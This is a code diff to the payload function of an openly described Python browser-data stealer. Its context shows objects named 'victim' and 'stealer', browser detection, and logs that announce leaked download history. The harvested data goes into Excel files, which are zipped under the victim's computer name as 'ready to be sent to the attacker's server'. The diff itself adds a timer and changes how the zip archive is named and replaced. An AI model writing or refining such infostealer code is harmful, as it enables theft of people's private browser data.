@@ -20,6 +20,10 @@ def writeDataToExcelSheet(workbook:openpyxl.Workbook, workbookFilename:str, shee
     workbook.save(workbookFilename)
 
 def payload():
+
+    # Start the timer
+    start = time.time()
+
     victim = victimEnvironment()
     lufevre = stealer()
     existingBrowsers:List[str] = victim.checkBrowserInstallation()
@@ -111,12 +115,22 @@ def payload():
             print(f"[+] => User download history leaked-------------amount: {len(downloadHistory):8,} row(s)")
 
     # Zip the created excel files
+    zipfileTitle = f"{os.environ['COMPUTERNAME']}_BrowserData.zip"
+    
+    # If the zip file already exists, remove it to replace with the new one
+    if os.path.exists(zipfileTitle):
+        os.remove(zipfileTitle)
+
     print("[+] Zipping the created excel files")
     for file in os.listdir():
         if file.endswith(".xlsx"):
-            with zipfile.ZipFile(f"{os.environ['COMPUTERNAME']}_BrowserInformation.zip", "a") as zipFile:
+            with zipfile.ZipFile(zipfileTitle, "a") as zipFile:
                 zipFile.write(file)
                 os.remove(file)
+
+    # End the timer
+    end = time.time()
+    print(f"[+] The process took {round(end - start, 3)} seconds")
 
     print("[+] Process completed, the excel files are zipped and ready to be sent to the attacker's server")
 
